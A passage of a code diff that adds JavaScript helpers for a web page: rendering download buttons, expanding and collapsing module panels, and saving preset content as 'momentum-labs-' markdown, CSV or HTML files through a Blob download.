+                ${esc(d.name)} (.${d.ext})
+              </button>
+            `).join("")}
+          </div>
+        </div>
+      </div>
+    `).join("");
+  }
+
+  function toggle(idx) {
+    const el = document.querySelector(`.module[data-idx="${idx}"]`);
+    if (el) el.classList.toggle("open");
+  }
+  function expandAll() {
+    document.querySelectorAll(".module").forEach(m => m.classList.add("open"));
+  }
+  function collapseAll() {
+    document.querySelectorAll(".module").forEach(m => m.classList.remove("open"));
+  }
+  function download(name, ext, kind) {
+    const src = DOWNLOADS[kind] && DOWNLOADS[kind][name];
+    if (!src) return;
+    const mimes = { md: "text/markdown", csv: "text/csv", html: "text/html" };
+    const blob = new Blob([src], { type: mimes[ext] || "text/plain" });
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "momentum-labs-" + name.toLowerCase().replace(/[^a-z0-9]+/g,"-") + "." + ext;
+    a.click();
+  }
+
+  return { ensureRendered, toggle, expandAll, collapseAll, download };
 })();
 
 /* =========================================================================
